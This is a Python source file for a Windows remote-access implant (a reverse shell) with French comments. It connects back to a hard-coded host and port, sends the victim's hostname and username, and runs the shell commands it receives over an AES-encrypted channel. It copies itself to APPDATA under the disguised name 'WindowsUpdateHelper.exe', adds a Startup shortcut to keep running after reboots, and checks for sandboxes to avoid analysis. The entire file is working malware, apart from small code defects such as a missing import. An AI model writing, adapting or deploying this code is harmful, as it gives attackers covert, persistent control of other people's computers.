import os
import sys
import base64
import socket
import subprocess
import time
import threading
import json
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
AES_KEY = b'CeciEstUneCle16!'
AES_IV = b'VoiciUnIVDe16Octets'
HOST = '192.168.1.10'
PORT = 4444

# Configuration de la persistance
PROCESS_NAME = "WindowsUpdateHelper.exe"
PERSIST_PATH = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', PROCESS_NAME)
STARTUP_FOLDER = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
SHORTCUT_PATH = os.path.join(STARTUP_FOLDER, "WindowsUpdateHelper.lnk")

def is_sandbox():
    try:
        kernel32 = ctypes.windll.kernel32
        c_ulong = ctypes.c_ulong
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", c_ulong),
                ("dwMemoryLoad", c_ulong),
                ("ullTotalPhys", c_ulonglong),
                ("ullAvailPhys", c_ulonglong),
                ("ullTotalPageFile", c_ulonglong),
                ("ullAvailPageFile", c_ulonglong),
                ("ullTotalVirtual", c_ulonglong),
                ("ullAvailVirtual", c_ulonglong),
                ("ullAvailExtendedVirtual", c_ulonglong),
            ]
        ram = MEMORYSTATUSEX()
        ram.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(ram))
        if ram.ullTotalPhys < 4 * 1024 * 1024 * 1024: 
            return True
        if os.cpu_count() < 2:
            return True
        username = os.environ.get('USERNAME', '').lower()
        if 'sandbox' in username or 'virus' in username or 'malware' in username:
            return True
        return False
    except Exception:
        return False

def create_shortcut(target, shortcut_path):
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.WindowStyle = 7 # Minimized
        shortcut.save()
        return True
    except ImportError:
        return False
    except Exception:
        return False

def establish_persistence_stealth():
    if is_sandbox(): return 

    current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    
    # Copie du fichier
    if not os.path.exists(PERSIST_PATH):
        try:
            if not os.path.exists(os.path.dirname(PERSIST_PATH)):
                os.makedirs(os.path.dirname(PERSIST_PATH))
            import shutil
            shutil.copyfile(current_path, PERSIST_PATH)
        except Exception:
            pass

    # Création du raccourci
    if not os.path.exists(SHORTCUT_PATH):
        try:
            if create_shortcut(PERSIST_PATH, SHORTCUT_PATH):
                # Si on a créé le raccourci depuis l'exe temporaire, on lance la copie et on quitte
                if current_path != PERSIST_PATH:
                    subprocess.Popen(PERSIST_PATH, shell=True)
                    sys.exit(0)
        except Exception:
            pass

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def run_cmd(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    try:
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            s.settimeout(60.0) 
            try:
                encrypted_cmd = s.recv(4096).decode('utf-8')
                if not encrypted_cmd:
                    break
            except socket.timeout:
                try:
                    s.send(aes_encrypt("PING").encode('utf-8'))
                except:
                    break
                continue

            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            if command == "PING":
                continue
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))

    except Exception:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def main_loop():
    establish_persistence_stealth()
    retry_count = 0
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.connect((HOST, PORT))
            
            retry_count = 0
            handle_connection(s)
            
        except Exception:
            retry_count += 1
            wait_time = min((retry_count * 2), 60)
            time.sleep(wait_time)

if __name__ == "__main__":
    # Lancement direct sans thread complexe pour plus de stabilité
    try:
        main_loop()
    except KeyboardInterrupt:
        sys.exit(0)